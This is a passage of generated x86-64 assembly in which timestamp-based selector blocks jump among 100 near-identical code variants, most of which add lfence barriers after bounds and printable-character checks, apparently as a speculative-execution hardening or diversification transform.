	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 36
.Lmain_win4_var36:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 37
.Lmain_win4_var37:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 38
.Lmain_win4_var38:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 39
.Lmain_win4_var39:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 40
.Lmain_win4_var40:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 41
.Lmain_win4_var41:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 42
.Lmain_win4_var42:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 43
.Lmain_win4_var43:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 44
.Lmain_win4_var44:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 45
.Lmain_win4_var45:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 46
.Lmain_win4_var46:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 47
.Lmain_win4_var47:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 48
.Lmain_win4_var48:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 49
.Lmain_win4_var49:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 50
.Lmain_win4_var50:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 51
.Lmain_win4_var51:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 52
.Lmain_win4_var52:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 53
.Lmain_win4_var53:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 54
.Lmain_win4_var54:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 55
.Lmain_win4_var55:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 56
.Lmain_win4_var56:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 57
.Lmain_win4_var57:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 58
.Lmain_win4_var58:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 59
.Lmain_win4_var59:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 60
.Lmain_win4_var60:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 61
.Lmain_win4_var61:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 62
.Lmain_win4_var62:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 63
.Lmain_win4_var63:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 64
.Lmain_win4_var64:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 65
.Lmain_win4_var65:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 66
.Lmain_win4_var66:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 67
.Lmain_win4_var67:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 68
.Lmain_win4_var68:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 69
.Lmain_win4_var69:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 70
.Lmain_win4_var70:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 71
.Lmain_win4_var71:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 72
.Lmain_win4_var72:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 73
.Lmain_win4_var73:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 74
.Lmain_win4_var74:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 75
.Lmain_win4_var75:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 76
.Lmain_win4_var76:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 77
.Lmain_win4_var77:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 78
.Lmain_win4_var78:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 79
.Lmain_win4_var79:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 80
.Lmain_win4_var80:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 81
.Lmain_win4_var81:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 82
.Lmain_win4_var82:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 83
.Lmain_win4_var83:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 84
.Lmain_win4_var84:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 85
.Lmain_win4_var85:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 86
.Lmain_win4_var86:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 87
.Lmain_win4_var87:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 88
.Lmain_win4_var88:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 89
.Lmain_win4_var89:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 90
.Lmain_win4_var90:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 91
.Lmain_win4_var91:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 92
.Lmain_win4_var92:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 93
.Lmain_win4_var93:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 94
.Lmain_win4_var94:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 95
.Lmain_win4_var95:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 96
.Lmain_win4_var96:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 97
.Lmain_win4_var97:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 98
.Lmain_win4_var98:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 99
.Lmain_win4_var99:
	popq	%rax
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
.Lmain_win4_continue:
	addq	$32, %rsp
	jmp	.L36
.L35:
	leaq	.LC13(%rip), %rax
.L36:
	movq	%rax, %rsi
	leaq	.LC14(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-20(%rbp), %edx
	movzbl	-10(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	cmpl	$3, %eax
	je	.Lmain_win3_var3
	cmpl	$4, %eax
	je	.Lmain_win3_var4
	cmpl	$5, %eax
	je	.Lmain_win3_var5
	cmpl	$6, %eax
	je	.Lmain_win3_var6
	cmpl	$7, %eax
	je	.Lmain_win3_var7
	cmpl	$8, %eax
	je	.Lmain_win3_var8
	cmpl	$9, %eax
	je	.Lmain_win3_var9
	cmpl	$10, %eax
	je	.Lmain_win3_var10
	cmpl	$11, %eax
	je	.Lmain_win3_var11
	cmpl	$12, %eax
	je	.Lmain_win3_var12
	cmpl	$13, %eax
	je	.Lmain_win3_var13
	cmpl	$14, %eax
	je	.Lmain_win3_var14
	cmpl	$15, %eax
	je	.Lmain_win3_var15
	cmpl	$16, %eax
	je	.Lmain_win3_var16
	cmpl	$17, %eax
	je	.Lmain_win3_var17
	cmpl	$18, %eax
	je	.Lmain_win3_var18
	cmpl	$19, %eax
	je	.Lmain_win3_var19
	cmpl	$20, %eax
	je	.Lmain_win3_var20
	cmpl	$21, %eax
	je	.Lmain_win3_var21
	cmpl	$22, %eax
	je	.Lmain_win3_var22
	cmpl	$23, %eax
	je	.Lmain_win3_var23
	cmpl	$24, %eax
	je	.Lmain_win3_var24
	cmpl	$25, %eax
	je	.Lmain_win3_var25
	cmpl	$26, %eax
	je	.Lmain_win3_var26
	cmpl	$27, %eax
	je	.Lmain_win3_var27
	cmpl	$28, %eax
	je	.Lmain_win3_var28
	cmpl	$29, %eax
	je	.Lmain_win3_var29
	cmpl	$30, %eax
	je	.Lmain_win3_var30
	cmpl	$31, %eax
	je	.Lmain_win3_var31
	cmpl	$32, %eax
	je	.Lmain_win3_var32
	cmpl	$33, %eax
	je	.Lmain_win3_var33
	cmpl	$34, %eax
	je	.Lmain_win3_var34
	cmpl	$35, %eax
	je	.Lmain_win3_var35
	cmpl	$36, %eax
	je	.Lmain_win3_var36
	cmpl	$37, %eax
	je	.Lmain_win3_var37
	cmpl	$38, %eax
	je	.Lmain_win3_var38
	cmpl	$39, %eax
	je	.Lmain_win3_var39
	cmpl	$40, %eax
	je	.Lmain_win3_var40
	cmpl	$41, %eax
	je	.Lmain_win3_var41
	cmpl	$42, %eax
	je	.Lmain_win3_var42
	cmpl	$43, %eax
	je	.Lmain_win3_var43
	cmpl	$44, %eax
	je	.Lmain_win3_var44
	cmpl	$45, %eax
	je	.Lmain_win3_var45
	cmpl	$46, %eax
	je	.Lmain_win3_var46
	cmpl	$47, %eax
	je	.Lmain_win3_var47
	cmpl	$48, %eax
	je	.Lmain_win3_var48
	cmpl	$49, %eax
	je	.Lmain_win3_var49
	cmpl	$50, %eax
	je	.Lmain_win3_var50
	cmpl	$51, %eax
	je	.Lmain_win3_var51
	cmpl	$52, %eax
	je	.Lmain_win3_var52
	cmpl	$53, %eax
	je	.Lmain_win3_var53
	cmpl	$54, %eax
	je	.Lmain_win3_var54
	cmpl	$55, %eax
	je	.Lmain_win3_var55
	cmpl	$56, %eax
	je	.Lmain_win3_var56
	cmpl	$57, %eax
	je	.Lmain_win3_var57
	cmpl	$58, %eax
	je	.Lmain_win3_var58
	cmpl	$59, %eax
	je	.Lmain_win3_var59
	cmpl	$60, %eax
	je	.Lmain_win3_var60
	cmpl	$61, %eax
	je	.Lmain_win3_var61
	cmpl	$62, %eax
	je	.Lmain_win3_var62
	cmpl	$63, %eax
	je	.Lmain_win3_var63
	cmpl	$64, %eax
	je	.Lmain_win3_var64
	cmpl	$65, %eax
	je	.Lmain_win3_var65
	cmpl	$66, %eax
	je	.Lmain_win3_var66
	cmpl	$67, %eax
	je	.Lmain_win3_var67
	cmpl	$68, %eax
	je	.Lmain_win3_var68
	cmpl	$69, %eax
	je	.Lmain_win3_var69
	cmpl	$70, %eax
	je	.Lmain_win3_var70
	cmpl	$71, %eax
	je	.Lmain_win3_var71
	cmpl	$72, %eax
	je	.Lmain_win3_var72
	cmpl	$73, %eax
	je	.Lmain_win3_var73
	cmpl	$74, %eax
	je	.Lmain_win3_var74
	cmpl	$75, %eax
	je	.Lmain_win3_var75
	cmpl	$76, %eax
	je	.Lmain_win3_var76
	cmpl	$77, %eax
	je	.Lmain_win3_var77
	cmpl	$78, %eax
	je	.Lmain_win3_var78
	cmpl	$79, %eax
	je	.Lmain_win3_var79
	cmpl	$80, %eax
	je	.Lmain_win3_var80
	cmpl	$81, %eax
	je	.Lmain_win3_var81
	cmpl	$82, %eax
	je	.Lmain_win3_var82
	cmpl	$83, %eax
	je	.Lmain_win3_var83
	cmpl	$84, %eax
	je	.Lmain_win3_var84
	cmpl	$85, %eax
	je	.Lmain_win3_var85
	cmpl	$86, %eax
	je	.Lmain_win3_var86
	cmpl	$87, %eax
	je	.Lmain_win3_var87
	cmpl	$88, %eax
	je	.Lmain_win3_var88
	cmpl	$89, %eax
	je	.Lmain_win3_var89
	cmpl	$90, %eax
	je	.Lmain_win3_var90
	cmpl	$91, %eax
	je	.Lmain_win3_var91
	cmpl	$92, %eax
	je	.Lmain_win3_var92
	cmpl	$93, %eax
	je	.Lmain_win3_var93
	cmpl	$94, %eax
	je	.Lmain_win3_var94
	cmpl	$95, %eax
	je	.Lmain_win3_var95
	cmpl	$96, %eax
	je	.Lmain_win3_var96
	cmpl	$97, %eax
	je	.Lmain_win3_var97
	cmpl	$98, %eax
	je	.Lmain_win3_var98
	cmpl	$99, %eax
	je	.Lmain_win3_var99
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 3
.Lmain_win3_var3:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 4
.Lmain_win3_var4:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 5
.Lmain_win3_var5:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 6
.Lmain_win3_var6:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 7
.Lmain_win3_var7:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 8
.Lmain_win3_var8:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 9
.Lmain_win3_var9:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 10
.Lmain_win3_var10:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 11
.Lmain_win3_var11:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 12
.Lmain_win3_var12:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 13
.Lmain_win3_var13:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 14
.Lmain_win3_var14:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 15
.Lmain_win3_var15:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 16
.Lmain_win3_var16:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 17
.Lmain_win3_var17:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 18
.Lmain_win3_var18:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 19
.Lmain_win3_var19:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 20
.Lmain_win3_var20:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 21
.Lmain_win3_var21:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 22
.Lmain_win3_var22:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 23
.Lmain_win3_var23:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 24
.Lmain_win3_var24:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 25
.Lmain_win3_var25:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 26
.Lmain_win3_var26:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 27
.Lmain_win3_var27:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 28
.Lmain_win3_var28:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 29
.Lmain_win3_var29:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 30
.Lmain_win3_var30:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 31
.Lmain_win3_var31:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 32
.Lmain_win3_var32:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 33
.Lmain_win3_var33:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 34
.Lmain_win3_var34:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 35
.Lmain_win3_var35:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 36
.Lmain_win3_var36:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 37
.Lmain_win3_var37:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 38
.Lmain_win3_var38:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 39
.Lmain_win3_var39:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 40
.Lmain_win3_var40:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 41
.Lmain_win3_var41:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 42
.Lmain_win3_var42:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 43
.Lmain_win3_var43:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 44
.Lmain_win3_var44:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 45
.Lmain_win3_var45:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 46
.Lmain_win3_var46:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 47
.Lmain_win3_var47:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
